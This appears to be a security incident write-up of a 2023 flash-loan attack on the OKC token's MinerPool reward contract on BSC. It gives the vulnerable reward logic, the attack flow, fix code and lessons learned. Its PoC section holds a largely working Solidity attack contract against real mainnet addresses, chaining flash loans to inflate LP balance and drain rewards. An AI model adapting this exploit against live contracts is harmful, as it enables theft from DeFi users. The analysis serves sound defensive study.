# OKC Flash Loan LP Reward Manipulation Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | OKC Token |
| Date | 2023-11-23 |
| Chain | BSC (Binance Smart Chain) |
| Loss | Undisclosed |
| Attack Type | 5x Chained DODO Flash Loan + processLPReward() Manipulation (5x Chained Flash Loan + LP Reward Manipulation) |
| CWE | CWE-840 (Business Logic Errors) |
| Attacker Address | Undisclosed |
| Attack Contract | AttackContract (deployed) |
| Vulnerable Contract | `0x36016C4F0E0177861E6377f73C380c70138E13EE` (MinerPool) |
| Fork Block | 33,464,598 |

## 2. Vulnerability Code Analysis

The OKC protocol's `MinerPool` contract calculated rewards in `processLPReward()` based on the caller's instantaneous LP token balance. The attacker nested 5 DODO flash loans with a PancakeSwap V3 flash loan to acquire large amounts of USDT, predicted a future contract address via RLP-encoded `CREATE` address calculation, pre-transferred LP tokens to that address, and then called `processLPReward()` to manipulate the reward payout.

```solidity
// Vulnerable pattern: reward calculation based on LP balance
contract MinerPool {
    IERC20 public lpToken; // USDT/OKC PancakeSwap LP

    // Vulnerable: only checks LP balance, no validation for add/remove within same block
    function processLPReward() external {
        uint256 lpBalance = lpToken.balanceOf(msg.sender);
        // Reward proportional to LP balance
        uint256 reward = calculateReward(lpBalance);
        OKC.transfer(msg.sender, reward);
    }
}
```

### On-Chain Original Code

Source: Bytecode decompiled

```solidity
// File: OKC_decompiled.sol
    function processLPReward() external {}  // ❌
```

**Vulnerability**: The `processLPReward()` function checks LP token balance at a single point in time and distributes rewards. By acquiring large liquidity via flash loan, minting LP tokens, and then calling `processLPReward()`, an attacker could receive far more rewards than legitimately earned.

## 3. Attack Flow

```
Attacker
  │
  ├─1─▶ Nest 5x DODO flash loans (DPP1~5)
  │      Each DPP: 0x81917eb96b..., 0xFeAFe253..., 0x26d0c625..., 0x6098A563..., 0x9ad32e30...
  │
  ├─2─▶ pancakeV3Pool.flash(2,500,000 USDT, 0, data)
  │      [PancakeV3Pool: 0x4f3126d5DE26413AbDCF6948943FB9D0847d9818]
  │      Acquire final USDT funds
  │
  ├─3─▶ swap() - USDT → OKC swap
  │      [USDT/OKC Pair: 0x9CC7283d8F8b92654e6097acA2acB9655fD5ED96]
  │
  ├─4─▶ mint() logic:
  │      a. Predict future contract address via RLP address calculation
  │      b. Transfer small amount of OKC to predicted address (new_attack_contract1)
  │      c. Deploy new AttackContract2() → auto-adds USDT + OKC as LP
  │      d. Deploy second AttackContract2 → add LP
  │      e. pancakePair_USDT_OKC.mint(address(this)) → acquire LP tokens
  │      f. Transfer LP to attack_contract2
  │
  ├─5─▶ minerPool.call(abi.encodeWithSignature("processLPReward()"))
  │      [MinerPool: 0x36016C4F0E0177861E6377f73C380c70138E13EE]
  │      Claim rewards while holding large LP balance
  │
  ├─6─▶ attack_contract2.transfer_all(pancakePair, address(this))
  │      Retrieve LP tokens
  │
  ├─7─▶ pancakeRouter.removeLiquidity(OKC, USDT, lp, ...)
  │      Burn LP to recover USDT + OKC
  │
  ├─8─▶ OKC → USDT reverse swap
  │
  └─9─▶ Repay 5x flash loans sequentially + realize profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

contract AttackContract {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 OKC = IERC20(0xABba891c633Fb27f8aa656EA6244dEDb15153fE0);
    address minerPool = 0x36016C4F0E0177861E6377f73C380c70138E13EE;
    IPancakePair pancakePair_USDT_OKC = IPancakePair(0x9CC7283d8F8b92654e6097acA2acB9655fD5ED96);
    IPancakeRouter pancakeRouter = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    uint256 nonce = 1;

    function expect1() external {
        OKC.approve(address(pancakeRouter), type(uint256).max);
        pancakePair_USDT_OKC.approve(address(pancakeRouter), type(uint256).max);
        // Initiate 5x DPP flash loans
        IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d)
            .flashLoan(0, USDT.balanceOf(address(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d)), address(this), "0");
    }

    function mint() private {
        // Calculate future contract address via RLP
        address new_attack_contract1 = calculateAddress(address(this), nonce);
        OKC.transfer(new_attack_contract1, 10_000_000_000_000_000);
        AttackContract2 attack_contract1 = new AttackContract2(); // consume nonce
        nonce++;

        address new_attack_contract2 = calculateAddress(address(this), nonce);
        USDT.transfer(new_attack_contract2, 100_000_000_000_000);
        OKC.transfer(new_attack_contract2, 1);
        AttackContract2 attack_contract2 = new AttackContract2();

        // Mint LP
        (uint112 r0, uint112 r1,) = pancakePair_USDT_OKC.getReserves();
        uint256 amountb = pancakeRouter.quote(OKC.balanceOf(address(this)), r1, r0);
        USDT.transfer(address(pancakePair_USDT_OKC), amountb);
        OKC.transfer(address(pancakePair_USDT_OKC), OKC.balanceOf(address(this)));
        pancakePair_USDT_OKC.mint(address(this));

        // Transfer LP to attack_contract2
        pancakePair_USDT_OKC.transfer(address(attack_contract2), pancakePair_USDT_OKC.balanceOf(address(this)));

        // Call processLPReward
        minerPool.call(abi.encodeWithSignature("processLPReward()"));

        // Retrieve and remove LP
        attack_contract2.transfer_all(address(pancakePair_USDT_OKC), address(this));
        pancakeRouter.removeLiquidity(address(OKC), address(USDT),
            pancakePair_USDT_OKC.balanceOf(address(this)), 0, 0, address(this), block.timestamp + 1000);

        // OKC → USDT swap
        address[] memory path = new address[](2);
        path[0] = address(OKC);
        path[1] = address(USDT);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            OKC.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000);
    }

    // RLP address calculation
    function calculateAddress(address creator, uint256 n) public pure returns (address) {
        // ... (RLP encoding logic)
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-840 (Business Logic Errors) |
| Vulnerability Type | Instantaneous LP balance-based reward calculation; immediate reward claim after flash loan LP mint |
| Impact Scope | OKC MinerPool reward pool |
| Explorer | [BSCscan](https://bscscan.com/address/0x36016C4F0E0177861E6377f73C380c70138E13EE) |

## 6. Security Recommendations

```solidity
// Fix 1: Snapshot-based reward calculation (exclude same block)
mapping(address => uint256) public lpSnapshotBlock;
mapping(address => uint256) public lpSnapshotBalance;

function updateLPSnapshot() external {
    if (block.number > lpSnapshotBlock[msg.sender]) {
        lpSnapshotBalance[msg.sender] = lpToken.balanceOf(msg.sender);
        lpSnapshotBlock[msg.sender] = block.number;
    }
}

function processLPReward() external {
    require(block.number > lpSnapshotBlock[msg.sender], "Snapshot too recent");
    uint256 lpBalance = lpSnapshotBalance[msg.sender];
    // Snapshot-based reward calculation
}

// Fix 2: Minimum LP holding period
mapping(address => uint256) public lpDepositTimestamp;

function depositLP(uint256 amount) external {
    lpToken.transferFrom(msg.sender, address(this), amount);
    lpDepositTimestamp[msg.sender] = block.timestamp;
}

function processLPReward() external {
    require(block.timestamp >= lpDepositTimestamp[msg.sender] + 1 days, "Too early");
    // ...
}
```

## 7. Lessons Learned

1. **Instantaneous balance-based reward vulnerability**: Using the instantaneous LP token balance as the reward basis enables an attack where an adversary temporarily acquires a large LP position via flash loan and immediately claims rewards.
2. **RLP address pre-computation technique**: The technique of calculating a future contract address using RLP encoding of the `CREATE` opcode and pre-transferring tokens to that address represents an advanced attack pattern.
3. **5x DODO + PancakeV3 nesting**: A sophisticated structure nesting 6 flash loans was used to maximally leverage available flash loan liquidity on BSC.
4. **MinerPool reward mechanism**: Staking/farming reward mechanisms must always account for flash loan scenarios by enforcing a minimum holding period or applying snapshot-based calculations.